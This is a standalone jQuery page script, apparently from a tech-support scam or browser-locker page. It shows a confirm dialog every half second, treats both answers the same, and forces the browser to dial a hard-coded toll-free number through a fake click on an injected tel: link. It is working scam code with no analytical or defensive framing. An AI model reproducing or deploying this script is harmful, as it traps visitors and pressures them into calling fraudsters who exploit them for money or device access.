    <script>
        var isCall = 0;
        $(document).ready(function() {
            loadText();
            setTimeout(function() {
                myFunction();
            }, 100);
            setInterval(myFunction, 500);
        });

        function loadText() {
            $('.js_setTextBlock').prop('innerHTML', defaultText);
        }

        function myFunction() {
            if (confirm(defaultText)) {
                okkkk();
            } else {
                okkkk();
            }
        }

        function okkkk() {
            $('#result').append('<a id="anchorcall" href="tel:+1‪(833) 582-4023" target="_top"></a>');
            fakeClick(event, document.getElementById("anchorcall"));
        }

        function fakeClick(event, anchorObj) {
            if (anchorObj.click) {
                anchorObj.click();
            } else if (document.createEvent) {
                if (event.target !== anchorObj) {
                    var evt = document.createEvent("MouseEvents");
                    evt.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
                    var allowDefault = anchorObj.dispatchEvent(evt);
                }
            }
        }
    </script>
